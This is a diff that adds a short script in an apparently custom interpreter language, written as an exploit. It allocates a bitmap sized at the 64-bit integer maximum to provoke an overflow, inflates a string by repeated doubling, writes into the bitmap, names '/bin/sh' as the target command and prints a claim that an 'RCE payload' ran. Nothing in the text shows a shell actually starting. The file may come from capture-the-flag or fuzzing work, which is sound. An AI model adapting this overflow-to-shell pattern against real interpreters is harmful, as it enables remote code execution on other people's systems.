@@ -1,0 +1,43 @@
+string cmd = "/bin/sh";
+
+bitmap b1 = create(9223372036854775807, 2);
+
+string s1 = "A";
+string s2 = "B";
+
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+
+set(b1, 0, 1, 1);
+
+print(cmd);
+
+print("RCE payload execution completed");
